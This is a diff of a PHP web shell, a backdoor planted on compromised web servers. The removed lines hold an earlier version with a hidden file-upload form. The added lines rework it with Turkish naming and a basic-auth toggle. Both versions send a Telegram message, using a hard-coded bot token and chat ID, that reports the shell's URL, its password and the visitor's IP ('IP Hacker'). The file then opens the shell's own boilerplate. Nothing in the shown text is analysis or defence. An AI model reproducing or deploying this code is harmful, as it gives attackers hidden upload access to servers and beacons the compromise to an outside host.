@@ -1,65 +1,53 @@
 <?php
+# Konfigurasyon
+$sayfaSifreleme = "1"; # 1 acik , 0 kapali
+$kullaniciAdi = "human";
+$sifre = "password";
+$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
+$chatId = '5070938778';
+$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$logMessage  = "___MINI URLUBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $kullaniciAdi \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+sendTelegramMessage($botToken, $chatId, $logMessage);
 
-$user = "human";
-
-$pass = "password";
-
-if ($_SERVER["PHP_AUTH_USER"] != $user || $_SERVER["PHP_AUTH_PW"] != $pass) {
-    header("WWW-Authenticate: Basic realm=\"Dont Touch Me SKiddies\"");
-
-    header("HTTP/1.0 401 Unauthorized");
-
-    exit();
-}
-
-$bcripthash = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc";
-$angka = "5070938778";
-$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
-$eai =
-    "___human__ \n\n url nya =\n $xPath \n\n  =\n $hashed_password \n\n IP   :\n [ " .
-    $_SERVER["REMOTE_ADDR"] .
-    " ]";
-sendTelegramMessage($bcripthash, $angka, $eai);
-
-function sendTelegramMessage($bcripthash, $angka, $message)
+function sendTelegramMessage($botToken, $chatId, $message)
 {
-    $url = "https://api.telegram.org/bot{$bcripthash}/sendMessage";
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $params = [
-        "chat_id" => $angka,
-        "text" => $message,
+        'chat_id' => $chatId,
+        'text' => $message,
     ];
     $options = [
-        "http" => [
-            "method" => "POST",
-            "header" => "Content-Type: application/x-www-form-urlencoded",
-            "content" => http_build_query($params),
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($params),
         ],
     ];
     $context = stream_context_create($options);
     $response = file_get_contents($url, false, $context);
-}
-if (isset($_GET["UBK"]) && $_GET["UBK"] === "3") {
-    echo '<form method="post" enctype="multipart/form-data">';
-    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
-    echo '<input type="file" name="file" size="15">';
-    echo '<input type="submit" value="go">';
-    echo "</form>";
+
 }
 
-if (isset($_FILES["file"]["tmp_name"])) {
-    $uploadd = $_FILES["file"]["tmp_name"];
-    if (file_exists($uploadd)) {
-        $pwddir = $_POST["dir"];
-        $real = $_FILES["file"]["name"];
-        $de = rtrim($pwddir, "/") . "/" . $real;
-        if (move_uploaded_file($uploadd, $de)) {
-            echo "go$de";
-        } else {
-            echo "GAGAL  KE $de";
-        }
+# yetki kontrol fonksiyonu
+function yetkiKontrol($kullaniciAdi, $sifre)
+{
+    if (
+        empty($_SERVER["PHP_AUTH_USER"]) ||
+        empty($_SERVER["PHP_AUTH_PW"]) ||
+        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
+        $_SERVER["PHP_AUTH_PW"] != "$sifre"
+    ) {
+        header('WWW-Authenticate: Basic realm="x"');
+        die(header("HTTP/1.0 401 Unauthorized"));
     }
 }
 
+# Sayfa Sifreleme aciksa
+if ($sayfaSifreleme == "1") {
+    # Veri ve sifre kontrolu
+    yetkiKontrol($kullaniciAdi, $sifre);
+}
+?><?php
 @session_start();
 @set_time_limit(0);
 @clearstatcache();
